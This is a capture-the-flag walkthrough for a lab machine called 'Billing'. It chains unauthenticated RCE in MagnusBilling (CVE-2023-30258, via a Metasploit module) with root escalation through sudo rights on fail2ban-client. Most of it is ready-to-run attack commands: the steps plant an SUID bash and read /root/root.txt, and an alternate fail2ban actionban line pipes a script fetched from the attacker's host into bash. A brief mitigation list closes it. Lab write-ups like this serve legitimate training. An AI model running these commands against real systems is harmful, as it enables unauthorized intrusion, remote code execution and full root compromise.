# Billing — Consolidated Walkthrough

> **Difficulty:** Medium — Web / Linux Privilege Escalation  
> **Goal:** Web RCE → Low-privilege shell (`asterisk`) → Privilege escalation to `root` via `fail2ban` misuse.

---

> This guide merges multiple community writeups into a clear, professional walkthrough. It emphasizes the logic behind each step, provides exact commands, and includes defensive notes for mitigation.

---

## 📑 Table of Contents

1. [Overview](#overview)
2. [Tools & Prereqs](#tools--prereqs)
3. [High-level Attack Flow](#high-level-attack-flow)
4. [Step-by-step Walkthrough](#step-by-step-walkthrough)
    - [Recon](#recon)
    - [Find the MagnusBilling App (`/mbilling`)](#find-the-magnusbilling-app-mbilling)
    - [Exploit: CVE-2023-30258 (MagnusBilling RCE)](#exploit-cve-2023-30258-magnusbilling-rce)
    - [Stabilize Shell & Enumerate as `asterisk`](#stabilize-shell--enumerate-as-asterisk)
    - [Privilege Escalation — Abusing `fail2ban-client` via `sudo` Rights](#privilege-escalation--abusing-fail2ban-client-via-sudo-rights)
    - [Alternate fail2ban Abuse](#alternate-fail2ban-abuse-actionban-to-cat-roottxt-or-spawn-reverse-shell)
5. [Cheat Sheet — Commands](#cheat-sheet---commands)
6. [Defensive Notes & Mitigations](#defensive-notes--mitigations)
7. [References](#references)

---

## 📝 Overview

**Billing** is a web box centered around **MagnusBilling**. Enumeration reveals a web app at `/mbilling` and services like MariaDB and Asterisk Manager. MagnusBilling (unpatched) is vulnerable to **CVE-2023-30258**, enabling unauthenticated remote command execution. This leads to a shell as `asterisk`. The box allows `asterisk` to run `/usr/bin/fail2ban-client` as root, which can be abused to execute arbitrary root commands and obtain a root shell.

---

## 🛠️ Tools & Prereqs

- **Attacker machine:** Kali / Parrot / Linux
- **Local tools:** `nmap`, `gobuster`/`dirb`, `curl`, `nc`, `msfconsole`, `socat`/`rlwrap`, `rsync`, `bash`, `python3`
- **Wordlists:** Common directory/web fuzzing lists
- **Listener:** `nc -lvnp <port>` or Metasploit handler

---

## 🚦 High-level Attack Flow

1. **Enumerate ports/services** (`nmap`) → discover port 80 + `/mbilling` ([0xb0b.gitbook.io][1])
2. **Identify MagnusBilling** at `/mbilling` ([0xb0b.gitbook.io][1])
3. **Exploit CVE-2023-30258** → reverse shell as `asterisk` ([0xb0b.gitbook.io][1])
4. **Stabilize shell, enumerate filesystem/users** ([0xb0b.gitbook.io][1])
5. **Privilege escalation:** abuse `fail2ban-client` via `sudo` ([0xb0b.gitbook.io][1])
6. **Obtain root**, capture `/root/root.txt` ([0xb0b.gitbook.io][1])

---

## 🏁 Step-by-step Walkthrough

### 1️⃣ Recon

Scan for open ports and directories:

```bash
nmap -sC -sV -p- -oA billing_initial <TARGET>
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,html,txt
```

**Findings:**  
- `80/tcp` → web server, `robots.txt` references `/mbilling/`
- `3306` → MariaDB  
- `5038` → Asterisk Manager

---

### 2️⃣ Find the MagnusBilling App (`/mbilling`)

Visit `http://<TARGET>/mbilling/` in your browser or via `curl`. The app identifies as **MagnusBilling**. Public exploits exist for **CVE-2023-30258**.

---

### 3️⃣ Exploit: CVE-2023-30258 (MagnusBilling RCE)

**A. Metasploit (Recommended):**
```text
msf6 > search magnus
msf6 > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
msf6 exploit(...)> set RHOST <TARGET>
msf6 exploit(...)> set LHOST <YOUR_IP>
msf6 exploit(...)> run
```
*Yields shell as `asterisk`.*

**B. Manual POC:**  
Send crafted HTTP requests with `curl` to trigger a reverse shell. See [NATSec][2] for details.

---

### 4️⃣ Stabilize Shell & Enumerate as `asterisk`

Upgrade shell and enumerate:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
id; whoami; ls -la; cat /etc/passwd
```

Look for user home directories, readable configs, and `/etc/fail2ban`.

---

### 5️⃣ Privilege Escalation — Abusing `fail2ban-client` via `sudo` Rights

Check allowed `sudo` commands:

```bash
sudo -l
```
*Output:*
```
(ALL : ALL) NOPASSWD: /usr/bin/fail2ban-client
```

**Exploit Sequence:**
```bash
rsync -av /etc/fail2ban/ /tmp/fail2ban/
cat > /tmp/script <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/script
cat > /tmp/fail2ban/action.d/custom-start-command.conf <<'EOF'
[Definition]
actionstart = /tmp/script
EOF
cat >> /tmp/fail2ban/jail.local <<'EOF'
[my-custom-jail]
enabled = true
action = custom-start-command
EOF
sudo fail2ban-client -c /tmp/fail2ban/ -v restart
/tmp/bash -p -c 'whoami; id; cat /root/root.txt'
```

---

### 6️⃣ Alternate fail2ban Abuse

**Read `root.txt` via actionban:**
```bash
sudo fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 666 /tmp/root.txt'"
sudo fail2ban-client set sshd banip 127.0.0.1
cat /tmp/root.txt
```

**Spawn reverse shell:**
```bash
sudo fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'curl http://<YOUR_IP>:9000/shell.sh | bash'"
sudo fail2ban-client set sshd banip 127.0.0.1
```

> ⚠️ **Note:** Ensure your listener/HTTP server is ready. Outbound HTTP may be restricted in some labs.

---

## 🧩 Cheat Sheet — Commands

```bash
# Recon
nmap -sC -sV -p- -oA billing_scan <TARGET>
gobuster dir -u http://<TARGET>/mbilling -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,html,txt

# Exploit
msf6 > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
msf6 > set RHOST <TARGET>
msf6 > set LHOST <YOUR_IP>
msf6 > run

# Shell stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
id; whoami; ls -la; cat /etc/passwd

# Privilege escalation (fail2ban)
rsync -av /etc/fail2ban/ /tmp/fail2ban/
cat > /tmp/script <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/script
cat > /tmp/fail2ban/action.d/custom-start-command.conf <<'EOF'
[Definition]
actionstart = /tmp/script
EOF
cat >> /tmp/fail2ban/jail.local <<'EOF'
[my-custom-jail]
enabled = true
action = custom-start-command
EOF
sudo fail2ban-client -c /tmp/fail2ban/ -v restart
/tmp/bash -p -c 'cat /root/root.txt'
```

---

## 🛡️ Defensive Notes & Mitigations

- **Patch MagnusBilling** to address CVE-2023-30258.
- **Restrict `sudo` access** for `fail2ban-client` to trusted users only.
- **Monitor config directories** for unauthorized changes.
- **Audit fail2ban actions** and custom scripts.

---

